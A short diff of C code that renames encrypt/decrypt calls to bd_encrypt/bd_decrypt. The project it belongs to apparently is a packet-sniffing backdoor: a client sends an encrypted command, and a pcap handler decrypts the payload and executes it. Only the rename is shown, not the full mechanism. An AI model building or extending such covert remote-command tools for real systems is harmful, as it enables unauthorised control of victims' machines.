@@ -121,7 +121,7 @@ void client(struct client_opt c_opt){
     /* Encrypt command */
     
     char *bd_message;
-    bd_message = encrypt(c_opt.command);
+    bd_message = bd_encrypt(c_opt.command);
     
     /* Set packet options and send packet */
     
@@ -382,7 +382,7 @@ void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char
     /* Decrypt remaining packet data */
     
     char *bd_command;
-    bd_command = decrypt((char *)packet_info.payload);
+    bd_command = bd_decrypt((char *)packet_info.payload);
     
     // Execute command
     FILE *fp;
